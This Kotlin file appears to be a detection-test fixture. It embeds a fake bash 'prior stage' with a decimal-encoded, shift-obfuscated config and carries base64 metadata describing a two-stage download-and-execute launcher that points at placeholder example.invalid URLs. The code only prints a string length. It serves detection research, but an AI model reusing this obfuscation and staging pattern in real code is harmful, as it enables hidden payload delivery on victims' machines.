// HUNTRESS_ANALYSIS_V1:B64-dj0zfGxhbmd1YWdlPWtvdGxpbnxyb2xlPWxhdW5jaGVyfHZlcmRpY3Q9c3VzcGljaW91c3xhdHRhY2s9VDEwNTl8YWRhcHRlcj1wcm9jZXNzX3NwYXdufGhvc3RfcHJvZmlsZT1lbWJlZGRlZF9wcmlvcnxvYmZ1c2NhdGlvbl9wcm9maWxlPWJhc2U2NHxzdGFnZV9wcm9maWxlPXR3b19zdGFnZV9kb3dubG9hZF9leGVjdXRlfG5leHRfbGFuZ3VhZ2U9cG93ZXJzaGVsbHxzdGFnZV9jb3VudD0yfHN0ZXBzPWFjcXVpcmVfcmVtb3RlLGRpc3BhdGNoX3Byb2Nlc3N8Y2FtcGFpZ25faWQ9S09UTElOLTc3ZDBlM2EyfHVybD1odHRwczovL2tvdGxpbi03N2QwZTNhMi5leGFtcGxlLmludmFsaWQvb3V0ZXJ8ZmlsZV9wYXRoPS90bXAvaHVudHJlc3Mta290bGluLy5rb3RsaW4tNzdkMGUzYTIuc3RhZ2U=
package huntress.fixture
val priorStage = """
    #!/usr/bin/env bash
    readonly Material_9c41d2ee='127,70,58,133,124,125,110,121,124,70,106,108,122,126,114,123,110,104,123,110,118,120,125,110,53,109,114,124,121,106,125,108,113,104,121,123,120,108,110,124,124,133,126,123,117,70,113,125,125,121,124,67,56,56,121,123,114,120,123,54,107,106,124,113,55,110,129,106,118,121,117,110,55,114,119,127,106,117,114,109,56,124,133,111,114,117,110,70,56,125,118,121,56,55,121,123,114,120,123,58'
    readonly Codec_9c41d2ee='decimal_comma|subtract_modulo_256|9'
    Load_9c41d2ee() {
      local IFS=','
      read -r -a v_a19c <<< "${'$'}{Material_9c41d2ee}"
    }
""".trimIndent()
fun main() = println(priorStage.length)
